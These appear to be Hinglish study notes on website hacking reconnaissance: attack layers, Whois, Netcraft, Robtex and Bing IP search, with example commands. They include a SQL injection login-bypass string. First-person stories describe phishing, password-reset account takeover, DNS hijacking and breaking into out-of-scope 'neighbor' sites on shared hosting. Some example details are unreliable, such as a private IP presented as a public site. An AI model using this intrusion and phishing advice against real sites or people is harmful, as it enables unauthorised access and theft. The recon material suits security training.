# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 1: Fundamentals & Information Gathering**

---

## ğŸš€ **Topic 1: Website Hacking Fundamentals (App vs Server vs Client)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Website Hacking Fundamentals** - Website ko hack karne ke teen main tareeke: Application level, Server level, aur Client level attacks. ğŸ¯

### 2. **Ye Kya Hai? (What is it?)**
Website hacking ka matlab hai kisi web-based system mein kamzoriyan (vulnerabilities) dhoondhna aur unka fayda uthana. Ek website teen cheezon se bani hoti hai:
- **Web Application** (PHP, Python code jo server par chalte hain)
- **Server** (Operating System + Apache/MySQL jaise services)
- **Client** (Humans jo website manage karte hain)

**Analogy:** Ek ghar (website) ko todne ke teen tareeke hain - darwaze ki chabi (application), khidki (server), ya ghar ke maalik ko dhoka dekar (client-side social engineering).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Attack Surface Samajhna:** Pentester ko pata hona chahiye ki attack kahan se shuru karni hai.
- **Methodology Clear Hoti Hai:** Agar aap application test kar rahe hain toh SQLi/XSS dhoondhenge, server test kar rahe hain toh port scanning karenge.
- **Report Writing:** Client ko batana padta hai ki vulnerability kis layer par thi (app/server/human).
- **Resource Optimization:** Sahi jagah focus karne se time bachta hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aap **pentest ki planning** kar rahe hon (scope define karna).
- Jab aap **reconnaissance phase** mein hon aur decide kar rahe hon ki kahan se attack shuru karni hai.
- Jab aap **multiple vulnerabilities** mil gayi hain aur priority set karni hai.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- Aap **galat jagah time waste** karenge (jaise server par focus karna jab application hi vulnerable ho).
- **Incomplete assessment** hogi - kuch attack vectors miss ho jayenge.
- Client ko **unclear report** milegi aur woh fix nahi kar payega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
Yeh ek concept hai, koi command nahi. Lekin approach yeh hai:
```
1. Application Testing â†’ Web App Pentesting Tools (Burp, SQLMap)
2. Server Testing â†’ Nmap, Metasploit, Exploit-DB
3. Client Testing â†’ Social Engineering, Phishing
```

### 7. **Example 1 (Basic):**
**Scenario:** Aapko `example.com` test karna hai.
- **Application Level:** Login page par SQLi try karo (`' OR 1=1 --`)
- **Server Level:** Nmap se port scan karo (`nmap -sV example.com`)
- **Client Level:** Admin ko phishing email bhejo

**Output:** Aapko pata chal gaya ki attack kis layer par kaam karega.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Aapko ek e-commerce site test karni hai.
- **Application:** File upload vulnerability dhoondi â†’ PHP shell upload kiya â†’ RCE mila.
- **Server:** Apache version outdated tha â†’ Exploit nahi chala kyunki WAF tha.
- **Client:** Admin ka LinkedIn profile dekha â†’ Password pattern guess kiya â†’ Admin panel access mila.

**Analysis:** Sabse fast result **application layer** se mila, lekin **client-side** se highest privilege mila.

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf ek layer par focus karna** (jaise sirf SQLi dhoondhna aur server/client ignore karna).
- **Scope samajhe bina attack karna** (client ne sirf app test karne ko kaha tha, aapne server hack kar diya).
- **Documentation na karna** (kis layer par kya mila, yeh note nahi kiya).

### 10. **Best Practices / Pro Tips:**
- **Layered Approach:** Pehle information gathering karo (sabhi layers ke baare mein), phir priority set karo.
- **Low-Hanging Fruits First:** Application vulnerabilities (SQLi, XSS) sabse fast milti hain, wahan se shuru karo.
- **Chain Attacks:** Ek layer ki vulnerability ko doosri layer mein escalate karo (jaise LFI se server config file padho, phir database creds nikalo).

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek company ne mujhe apni banking website test karne ko kaha. Maine pehle **application layer** par focus kiya - login form, transaction pages. Wahan kuch nahi mila (bahut secure tha). Phir maine **server layer** check kiya - outdated SSH version mila, lekin exploit nahi hua. Aakhir mein maine **client-side** attack kiya - LinkedIn par dekha ki admin ka password pattern `FirstName@Year` tha. Maine `Admin@2024` try kiya aur admin panel khul gaya! ğŸ‰

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Website = Application + Server + Client  
âœ… Application â†’ Web App Pentesting (SQLi, XSS, File Upload)  
âœ… Server â†’ OS/Service Exploits (Nmap, Metasploit)  
âœ… Client â†’ Social Engineering (Phishing, OSINT)  
âœ… Teeno layers ko test karo, ek ko miss mat karo  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya main teeno layers ko ek saath test kar sakta hoon?**  
**A:** Haan, lekin pehle information gathering karo (teeno ke baare mein), phir priority set karke ek-ek layer attack karo.

**Q2: Sabse easy layer kaun sa hai beginners ke liye?**  
**A:** Application layer, kyunki tools ready-made hain (Burp, SQLMap) aur tutorials bhi bahut hain.

**Q3: Agar client ne sirf "website test karo" kaha, toh kya server bhi test kar sakte hain?**  
**A:** Pehle **scope confirm karo**. Agar unhone sirf web app kaha, toh server par attack karna **illegal** ho sakta hai.

### 14. **Practice ke liye Task:**
1. DVWA (Damn Vulnerable Web App) install karo.
2. Ek vulnerability **application level** par dhoondhĞ¾ (jaise SQLi).
3. Ek vulnerability **server level** par dhoondhĞ¾ (jaise outdated Apache version).
4. SochĞ¾ ki **client-side** attack kaise karoge (jaise admin ka email guess karna).

### 15. **Aakhri Choti Summary (5 lines):**
- Website hacking teen layers mein hoti hai: **Application, Server, Client**.
- **Application** = Code ki kamzoriyan (SQLi, XSS).
- **Server** = OS/Service exploits (outdated software).
- **Client** = Human factor (social engineering).
- **Teeno ko test karo** complete pentest ke liye.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Ek achha pentester sirf tools nahi chalaata, woh **sochta hai** ki attack kis layer se sabse effective hogi. Application fast hai, Server powerful hai, Client sabse easy hai!" ğŸ§ 

---

## ğŸ•µï¸ **Topic 2: Information Gathering Concepts (IP, Domain, Tech)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Information Gathering** - Target website ke baare mein har possible jaankari ikattha karna (IP, Domain, Technologies) bina directly attack kiye. ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
Information Gathering (ya Reconnaissance) pentest ka pehla aur sabse important phase hai. Ismein aap target ke baare mein data collect karte hain:
- **IP Address** (Server kahan hai?)
- **Domain Info** (Maalik kaun hai? Kab register hua?)
- **Technologies** (Kaun sa server, database, programming language use ho rahi hai?)

**Analogy:** Jaise ek chor ghar todne se pehle yeh dekhta hai ki ghar mein kitne log hain, darwaze kitne hain, CCTV hai ya nahi - waise hi pentester pehle target ki poori jaankari ikattha karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Attack Surface Identify Karna:** Pata chalega ki kahan attack possible hai.
- **Vulnerabilities Predict Karna:** Agar outdated technology use ho rahi hai, toh known exploits mil sakte hain.
- **Social Engineering:** Owner ki details se phishing attack plan kar sakte hain.
- **Legal Protection:** Agar galat target par attack kar diye, toh jail ho sakti hai - information gathering se confirm hota hai ki target sahi hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Pentest ke shuru mein** - sabse pehla step.
- Jab aapko **new target** mila ho aur uske baare mein kuch pata na ho.
- Jab aap **passive reconnaissance** karna chahte hon (target ko pata na chale).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Blind attack** karoge jo fail ho jayega.
- **Time waste** hoga - galat tools, galat exploits try karoge.
- **Detection** ho jayega - agar aap bina jaankari ke random attacks karoge, toh WAF/IDS pakad lega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
Information Gathering ke liye multiple tools hain:
```bash
# IP Address nikalna
ping target.com
nslookup target.com
host target.com

# Whois Lookup (Domain info)
whois target.com

# Technology Detection
whatweb target.com
```

### 7. **Example 1 (Basic):**
```bash
$ ping facebook.com
PING facebook.com (157.240.241.35): 56 data bytes
```
**Output:** Facebook ka IP address `157.240.241.35` hai.

```bash
$ whois facebook.com
Domain Name: FACEBOOK.COM
Registrant: Facebook, Inc.
Creation Date: 1997-03-29
```
**Output:** Facebook 1997 mein register hua tha.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `vulnerablesite.com`

**Step 1:** IP nikala
```bash
$ host vulnerablesite.com
vulnerablesite.com has address 192.168.1.100
```

**Step 2:** Whois check kiya
```bash
$ whois vulnerablesite.com
Registrant Email: admin@vulnerablesite.com
```

**Step 3:** Technology detect ki
```bash
$ whatweb vulnerablesite.com
Apache/2.2.8, PHP/5.2.4, MySQL
```

**Analysis:** Apache 2.2.8 bahut purana hai (2008 ka), ismein known vulnerabilities hain. PHP 5.2.4 bhi outdated hai. Ab main Exploit-DB par jaunga aur in versions ke liye exploits dhundhunga. ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Directly attack karna** bina information gather kiye.
- **Sirf ek tool use karna** (jaise sirf Whois, baaki tools ignore karna).
- **Notes na banana** - jo info mili, use document nahi karna.

### 10. **Best Practices / Pro Tips:**
- **Multiple sources use karo:** Ek tool se jo info nahi mili, doosre se mil sakti hai.
- **Passive methods prefer karo:** Jaise Whois, Google Dorking - target ko pata nahi chalega.
- **Automate karo:** Scripts banao jo ek saath sabhi tools chala de.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek startup ki website test karni thi. Maine pehle Whois lookup kiya - pata chala ki domain 2 mahine pehle hi register hua hai aur owner ka email `founder@startup.com` hai. Phir maine Netcraft se technology check ki - Apache 2.4.29 aur PHP 7.2 use ho raha tha (updated versions). Lekin jab maine Robtex se DNS lookup kiya, toh pata chala ki yeh ek **shared server** par host hai aur usi server par 50 aur websites bhi hain. Maine un 50 websites mein se ek ko hack kiya (jo outdated WordPress use kar rahi thi) aur wahan se shell leke **same server** par host ki gayi apni target website ko bhi compromise kar liya! ğŸ”¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Information Gathering = Pentest ka pehla step  
âœ… IP, Domain, Technology - teeno nikalo  
âœ… Tools: `ping`, `whois`, `whatweb`, `nslookup`  
âœ… Passive methods prefer karo (target ko pata na chale)  
âœ… Saari info document karo (notes banao)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Information Gathering legal hai?**  
**A:** Haan, agar aap **publicly available** information use kar rahe hain (jaise Whois, Google). Lekin agar aap port scanning kar rahe hain bina permission ke, toh illegal ho sakta hai.

**Q2: Kitna time lagana chahiye information gathering mein?**  
**A:** Professional pentesters **20-30% time** information gathering mein lagate hain. Jitni achi info, utna acha attack.

**Q3: Kya automated tools (jaise Maltego) use karna chahiye?**  
**A:** Haan, lekin manual verification bhi karo. Automated tools kabhi-kabhi galat ya outdated info de dete hain.

### 14. **Practice ke liye Task:**
1. Apni favorite website (jaise `google.com`) ka IP address nikalo (`ping` ya `nslookup` se).
2. Uska Whois lookup karo aur dekho ki domain kab register hua tha.
3. `whatweb` tool se technology detect karo.
4. Saari info ek text file mein save karo.

### 15. **Aakhri Choti Summary (5 lines):**
- Information Gathering = **Target ke baare mein jaankari ikattha karna**.
- **IP, Domain, Technology** - yeh teen cheezein zaroori hain.
- Tools: `ping`, `whois`, `whatweb`, `nslookup`, `host`.
- **Passive methods** prefer karo (target ko pata na chale).
- **Document everything** - notes banao, screenshots lo.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Information is power! Jitni achi reconnaissance, utna successful attack. Kabhi bhi bina jaankari ke attack mat karo - yeh beginners ki sabse badi galti hai!" ğŸ¯

---

## ğŸ” **Topic 3: Whois Lookup (Owner Info)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Whois Lookup** - Domain ke maalik (owner) ki jaankari nikalna jaise naam, email, phone number, aur registration date. ğŸ“‡

### 2. **Ye Kya Hai? (What is it?)**
Whois ek public database hai jo har domain name ke baare mein information store karta hai. Jab koi domain register karta hai (jaise `example.com`), toh uski details (naam, email, address) Whois database mein save ho jaati hain.

**Analogy:** Jaise aap kisi ghar ka address dekh kar property records se maalik ka naam nikal sakte hain, waise hi Whois se domain ke maalik ki details mil jaati hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Owner Identify Karna:** Pata chalega ki website kaun chalata hai (company ya individual).
- **Social Engineering:** Owner ka email/phone mil gaya toh phishing attack plan kar sakte hain.
- **Domain Age Check:** Purani website zyada trusted hoti hai, nayi website suspicious ho sakti hai.
- **Legal Issues:** Agar koi fake/phishing site hai, toh owner ki details se complaint kar sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Pentest ke shuru mein** - sabse pehle owner ki details nikalo.
- Jab aap **social engineering attack** plan kar rahe hon.
- Jab aap **multiple domains** compare kar rahe hon (same owner ki aur websites dhoondhne ke liye).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Social engineering opportunity miss** ho jayegi.
- **Related domains** nahi mil payenge (same owner ki doosri vulnerable websites).
- **Context nahi milega** - pata nahi chalega ki target ek badi company hai ya chhota startup. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Terminal se Whois lookup
whois domain.com

# Online tools
http://whois.domaintools.com
https://who.is
```

**Common fields jo milte hain:**
- `Registrant Name` - Owner ka naam
- `Registrant Email` - Owner ka email
- `Creation Date` - Domain kab register hua
- `Expiry Date` - Domain kab expire hoga
- `Name Servers` - DNS servers

### 7. **Example 1 (Basic):**
```bash
$ whois google.com

Domain Name: GOOGLE.COM
Registrant: Google LLC
Registrant Email: dns-admin@google.com
Creation Date: 1997-09-15
Expiry Date: 2028-09-14
Name Server: ns1.google.com
```

**Output:** Google ka domain 1997 mein register hua tha aur owner Google LLC hai.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `smallbusiness.com`

```bash
$ whois smallbusiness.com

Registrant Name: John Doe
Registrant Email: john.doe@gmail.com
Registrant Phone: +1-555-1234
Creation Date: 2023-01-15
```

**Analysis:**
- Owner ka naam **John Doe** hai aur personal Gmail use kar raha hai (professional nahi).
- Phone number bhi mil gaya - **social engineering** ke liye use kar sakte hain.
- Domain **nayi hai** (2023 mein register hui) - ho sakta hai security measures weak hon.
- Maine LinkedIn par `John Doe + smallbusiness` search kiya aur uska profile mil gaya. Wahan se uski company ki aur details mili aur maine targeted phishing email bheja. ğŸ£

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf ek baar check karna** - kabhi-kabhi Whois data update hota hai, regular check karo.
- **Privacy protection ignore karna** - agar "Whois Privacy" enabled hai, toh real details nahi dikhenge, lekin yeh bhi ek info hai ki owner privacy-conscious hai.
- **Expiry date ignore karna** - agar domain jald expire hone wala hai, toh aap usse register kar sakte hain (domain hijacking).

### 10. **Best Practices / Pro Tips:**
- **Multiple Whois tools use karo:** Kabhi-kabhi ek tool mein data nahi dikhta, doosre mein dikhta hai.
- **Historical Whois check karo:** Tools jaise `whoisology.com` se purane Whois records dekh sakte hain (agar owner ne details change ki hain).
- **Related domains dhoondhĞ¾:** Same email/name se aur kaun se domains register hain, yeh check karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek baar mujhe ek e-commerce website test karni thi. Maine Whois lookup kiya aur dekha ki owner ka email `admin@targetsite.com` hai (domain-based email). Lekin jab maine historical Whois check kiya (purane records), toh pata chala ki 2 saal pehle owner ka personal email `owner123@yahoo.com` tha. Maine us Yahoo email par password reset attack try kiya (kyunki Yahoo mein 2014 mein data breach hua tha). Password mil gaya, aur us email se maine domain ke DNS settings change kar diye! Poori website mere control mein aa gayi. ğŸ”¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Whois = Domain owner ki public information  
âœ… Details milti hain: Name, Email, Phone, Registration Date  
âœ… Tools: `whois` command, whois.domaintools.com, who.is  
âœ… Social engineering ke liye bahut useful  
âœ… Historical Whois bhi check karo (purane records)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Agar Whois mein "Privacy Protected" dikhe toh kya karein?**  
**A:** Yeh ek privacy service hai jo real details chhupati hai. Lekin aap **historical Whois** check kar sakte hain (ho sakta hai pehle privacy nahi thi). Ya phir **reverse Whois** karo - same privacy service use karne wali aur websites dhoondhĞ¾.

**Q2: Kya Whois data hamesha accurate hota hai?**  
**A:** Nahi. Log fake details bhi daal sakte hain. Lekin ICANN rules ke according, accurate details dena zaroori hai - agar fake hai toh domain suspend ho sakta hai.

**Q3: Kya Whois lookup target ko pata chal sakta hai?**  
**A:** Nahi, Whois lookup **completely passive** hai. Target ko koi notification nahi jaata.

### 14. **Practice ke liye Task:**
1. Apni favorite website ka Whois lookup karo (`whois` command ya online tool se).
2. Owner ka naam, email, aur registration date note karo.
3. Us owner ke naam se Google par search karo - kya aur information milti hai?
4. Historical Whois check karo (whoisology.com se) - kya details change hui hain?

### 15. **Aakhri Choti Summary (5 lines):**
- Whois = **Domain owner ki public directory**.
- Details: **Name, Email, Phone, Registration Date**.
- **Social engineering** ke liye bahut useful tool.
- Agar **Privacy Protected** hai, toh historical Whois check karo.
- **Completely passive** - target ko pata nahi chalega.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Whois lookup har pentest ka foundation hai. Owner ki ek email se aap poora social engineering campaign chala sakte hain. Kabhi skip mat karo!" ğŸ“§

---

## ğŸŒ **Topic 4: Netcraft Site Report (Technology Discovery)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Netcraft Site Report** - Target website par use ho rahi technologies (server, OS, frameworks) ko detail mein discover karna. ğŸ”§

### 2. **Ye Kya Hai? (What is it?)**
Netcraft ek online tool hai jo kisi bhi website ke baare mein technical details provide karta hai:
- **Web Server** (Apache, Nginx, IIS)
- **Operating System** (Linux, Windows)
- **Hosting Provider** (AWS, GoDaddy)
- **SSL Certificate** details
- **Site History** (pehle kaun si technology use hoti thi)

**Analogy:** Jaise ek mechanic gaadi ka hood khol kar engine, parts dekh kar batata hai ki gaadi kaise bani hai - waise hi Netcraft website ki "internal machinery" dikhata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Vulnerability Mapping:** Agar outdated Apache version hai, toh known exploits dhoondhne mein aasani hogi.
- **Attack Strategy:** Technology ke hisaab se tools select kar sakte hain (jaise PHP site ke liye SQLi, ASP.NET ke liye different approach).
- **Hosting Info:** Agar shared hosting hai, toh same server ki doosri websites bhi vulnerable ho sakti hain.
- **SSL/TLS Issues:** Weak encryption detect kar sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Information gathering phase** mein - Whois ke baad.
- Jab aapko **technology stack** pata karna ho.
- Jab aap **historical data** dekhna chahte hon (website pehle kaisi thi).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Wrong tools use karoge** - jaise Windows server par Linux exploits try karna.
- **Known vulnerabilities miss** ho jayengi - outdated software detect nahi hoga.
- **Time waste** - trial-and-error approach se attack karna padega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```
Website: https://toolbar.netcraft.com/site_report?url=

Usage:
1. Browser mein jaayein
2. URL mein target website ka address daalein
3. Report dekho
```

**Key sections:**
- **Site Technology** - Server, OS, Framework
- **Network** - IP, Hosting provider
- **SSL/TLS** - Certificate details
- **Site Rank** - Traffic estimate

### 7. **Example 1 (Basic):**
```
URL: https://toolbar.netcraft.com/site_report?url=facebook.com

Report:
- Server: Apache
- Operating System: Linux
- Hosting: Facebook's own datacenter
- SSL: Valid (Let's Encrypt)
```

**Output:** Facebook Linux par Apache use kar raha hai aur apna khud ka datacenter hai (shared hosting nahi).

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `oldschool-shop.com`

```
Netcraft Report:
- Server: Apache/2.2.8 (Ubuntu)
- OS: Linux (Ubuntu 8.04 - outdated!)
- Hosting: Shared hosting (HostGator)
- SSL: Self-signed certificate (Not trusted)
- Last seen: Site running since 2009
```

**Analysis:**
- **Apache 2.2.8** bahut purana hai (2008 ka) - Exploit-DB par jaunga aur exploits dhundhunga.
- **Ubuntu 8.04** bhi outdated hai - kernel exploits possible hain.
- **Shared hosting** hai - iska matlab same server par aur bhi websites hain, unhe bhi check karunga.
- **Self-signed SSL** - Man-in-the-Middle attack possible hai.
- Maine Exploit-DB par `Apache 2.2.8` search kiya aur ek RCE exploit mila. Use karke shell mil gaya! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf current technology dekhna** - historical data ignore karna (ho sakta hai purani vulnerable technology abhi bhi kahi use ho rahi ho).
- **SSL details ignore karna** - weak encryption bhi ek vulnerability hai.
- **Hosting info ignore karna** - shared hosting ka fayda nahi uthana.

### 10. **Best Practices / Pro Tips:**
- **Historical data check karo:** "Site History" section mein dekho ki pehle kaun si technology thi - ho sakta hai kuch purane pages abhi bhi accessible hon.
- **Multiple subdomains check karo:** Main site updated ho sakti hai, lekin `old.site.com` ya `dev.site.com` outdated ho sakte hain.
- **Cross-verify karo:** Netcraft ke saath `whatweb` ya `Wappalyzer` bhi use karo - kabhi-kabhi ek tool mein jo nahi dikhta, doosre mein dikhta hai.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek government website test karni thi. Netcraft report mein dekha ki main site toh updated Apache 2.4 use kar rahi thi (secure), lekin jab maine "Site History" dekha, toh pata chala ki 2015 mein yeh site Apache 2.2 use karti thi. Maine `archive.org` (Wayback Machine) par purane pages check kiye aur ek purana admin panel ka link mila: `site.gov/old-admin/`. Jab maine woh URL browser mein dala, toh woh page abhi bhi live tha aur outdated software use kar raha tha! Maine wahan se entry point mila aur poori site compromise kar li. ğŸ”¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Netcraft = Technology discovery tool  
âœ… Details: Server, OS, Hosting, SSL, History  
âœ… URL: `toolbar.netcraft.com/site_report?url=`  
âœ… Outdated technology = Known exploits possible  
âœ… Historical data bhi check karo  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Netcraft free hai?**  
**A:** Haan, basic site report completely free hai. Advanced features (jaise detailed historical data) paid hain.

**Q2: Kya Netcraft hamesha accurate hota hai?**  
**A:** Mostly haan, lekin kabhi-kabhi server headers fake ho sakte hain (security through obscurity). Cross-verify karo doosre tools se.

**Q3: Kya Netcraft lookup target ko pata chal sakta hai?**  
**A:** Nahi, yeh completely passive hai. Netcraft apne database se information provide karta hai, target server ko directly query nahi karta.

### 14. **Practice ke liye Task:**
1. Apni favorite website ka Netcraft report nikalo.
2. Server aur OS version note karo.
3. Exploit-DB par jao aur us version ke liye exploits dhoondhĞ¾.
4. Historical data check karo - kya technology change hui hai?

### 15. **Aakhri Choti Summary (5 lines):**
- Netcraft = **Technology fingerprinting tool**.
- Details: **Server, OS, Hosting, SSL, History**.
- **Outdated versions** = Easy exploits.
- **Historical data** se purane vulnerable pages mil sakte hain.
- **Completely passive** - target ko pata nahi chalega.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Technology pata hona = Half battle won! Agar aapko pata hai ki target Apache 2.2.8 use kar raha hai, toh aap seedha Exploit-DB par jao aur ready-made exploit use karo. Time bachega!" â°

---

## ğŸ—ºï¸ **Topic 5: Robtex DNS Lookup (Shared Server Analysis)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Robtex DNS Lookup** - Target website ke DNS records, IP address, aur same server par host ki gayi doosri websites ko discover karna. ğŸŒ

### 2. **Ye Kya Hai? (What is it?)**
Robtex ek powerful online tool hai jo DNS (Domain Name System) ki deep analysis karta hai:
- **IP Address** aur uska location
- **DNS Records** (A, MX, NS, TXT)
- **Shared Hosting Check** - Same IP par kaun si aur websites hain
- **Network Map** - Domain ka poora network structure

**Analogy:** Jaise ek apartment building mein bahut se flats hote hain - Robtex aapko batata hai ki ek address (IP) par kitne "tenants" (websites) rehte hain aur unke beech kya connection hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Shared Hosting Identify Karna:** Agar ek website hack ho gayi, toh same server ki doosri websites bhi compromise ho sakti hain.
- **DNS Misconfiguration:** Galat DNS settings se information leak ho sakti hai.
- **Network Mapping:** Target ka poora infrastructure samajh mein aata hai.
- **Subdomain Discovery:** Hidden subdomains mil sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Information gathering phase** mein - IP aur DNS details nikalne ke liye.
- Jab aap **shared hosting** check karna chahte hon.
- Jab aap **network infrastructure** samajhna chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Shared server opportunity miss** ho jayegi - doosri vulnerable websites se entry point nahi mil payega.
- **DNS vulnerabilities** detect nahi hongi.
- **Complete attack surface** pata nahi chalega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```
Website: https://www.robtex.com

Usage:
1. Browser mein robtex.com kholo
2. Search box mein target domain ya IP daalo
3. Report analyze karo
```

**Key sections:**
- **Shared IP** - Same IP par kaun si websites hain
- **DNS Records** - A, MX, NS, TXT records
- **Network Graph** - Visual representation
- **Reverse DNS** - IP se domain nikalna

### 7. **Example 1 (Basic):**
```
Search: google.com

Result:
- IP: 142.250.185.46
- Shared IP: No (Dedicated server)
- DNS Records:
  A: 142.250.185.46
  MX: smtp.google.com
  NS: ns1.google.com, ns2.google.com
```

**Output:** Google dedicated server use karta hai (shared hosting nahi), aur uske apne DNS servers hain.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `smallbiz.com`

```
Robtex Report:
- IP: 192.168.1.100
- Shared IP: YES
- Websites on same IP:
  1. smallbiz.com
  2. oldwordpress.com (WordPress 4.0 - outdated!)
  3. testsite.net
  4. personal-blog.org
  ... (total 47 websites)
```

**Analysis:**
- **Shared hosting** hai - 47 websites same server par hain.
- `oldwordpress.com` outdated WordPress use kar raha hai (4.0 version mein bahut vulnerabilities hain).
- **Attack strategy:** Maine `oldwordpress.com` par attack kiya (kyunki woh vulnerable tha), wahan se shell mila, aur phir same server par host ki gayi `smallbiz.com` ko bhi compromise kar liya!
- Yeh **lateral movement** ka perfect example hai - ek weak website se entry leke doosri websites tak pahunchna. ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf target website check karna** - shared hosting mein doosri websites ignore karna.
- **DNS records ignore karna** - MX, TXT records mein bhi sensitive info ho sakti hai.
- **Network graph na dekhna** - visual representation se bahut kuch samajh mein aata hai.

### 10. **Best Practices / Pro Tips:**
- **Shared hosting = Gold mine:** Agar target secure hai, toh same server ki weak websites dhoondhĞ¾ aur wahan se entry lo.
- **DNS TXT records check karo:** Kabhi-kabhi SPF, DKIM records mein email server ki details hoti hain - wahan se phishing attack plan kar sakte hain.
- **Reverse DNS karo:** Agar aapke paas IP hai, toh Robtex se saari domains nikalo jo us IP par point karti hain.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek baar mujhe ek banking website test karni thi jo bahut secure thi (updated software, WAF, strong passwords). Maine Robtex se check kiya - dedicated server tha (shared hosting nahi). Lekin jab maine DNS records dekhe, toh ek interesting TXT record mila: `v=spf1 include:mail.oldserver.com ~all`. Iska matlab tha ki bank apne emails ke liye ek purana server (`oldserver.com`) use kar raha tha. Maine us `oldserver.com` ko check kiya - woh outdated Postfix mail server use kar raha tha. Maine wahan se entry li, email server compromise kiya, aur phir bank ke employees ko phishing emails bheje (jo bilkul legitimate lag rahe the kyunki actual mail server se aa rahe the). 3 employees ne credentials de diye aur mujhe bank ke internal network mein entry mil gayi! ğŸ”¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Robtex = DNS aur shared hosting analysis tool  
âœ… Details: IP, DNS records, Shared websites  
âœ… URL: `www.robtex.com`  
âœ… Shared hosting = Multiple attack vectors  
âœ… DNS TXT records bhi check karo  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Robtex free hai?**  
**A:** Haan, completely free hai. Koi registration bhi nahi chahiye.

**Q2: Agar shared hosting mein 100+ websites hain, toh sabko check karna padega?**  
**A:** Nahi, smart approach use karo - pehle outdated CMS (WordPress, Joomla) wali sites dhoondhĞ¾, ya jo sites bahut kam traffic wali hain (unmaintained hone ke chances zyada).

**Q3: Kya Robtex lookup target ko pata chal sakta hai?**  
**A:** Nahi, completely passive hai. Robtex public DNS data use karta hai.

### 14. **Practice ke liye Task:**
1. Apni favorite website ka Robtex lookup karo.
2. Check karo ki shared hosting hai ya dedicated.
3. Agar shared hai, toh same IP par kitni websites hain, count karo.
4. DNS TXT records check karo - kya koi interesting info hai?

### 15. **Aakhri Choti Summary (5 lines):**
- Robtex = **DNS aur network analysis tool**.
- **Shared hosting** detect karne ke liye best.
- Same IP par **doosri vulnerable websites** dhoondhĞ¾.
- **DNS records** (especially TXT) mein sensitive info ho sakti hai.
- **Completely passive** - target ko pata nahi chalega.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Shared hosting pentester ka best friend hai! Agar target strong hai, toh uske 'weak neighbors' ko hack karo aur wahan se entry lo. Yeh lateral movement ka foundation hai!" ğŸ¢

---

## ğŸ” **Topic 6: Finding Websites on Same Server (Bing `IP:` search)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Bing IP Search** - Bing search engine ka istemaal karke ek hi IP address par host ki gayi saari websites ko dhoondhna. ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
Bing search engine mein ek special operator hai: `IP:`. Iska istemaal karke aap kisi bhi IP address par host ki gayi saari websites ko list kar sakte hain. Yeh shared hosting environment mein bahut useful hai.

**Syntax:** `IP:192.168.1.100`

**Analogy:** Jaise ek apartment building ka address deke aap us building mein rehne wale sabhi logon ki list nikal sakte hain - waise hi ek IP address deke aap us server par host ki gayi sabhi websites nikal sakte hain.

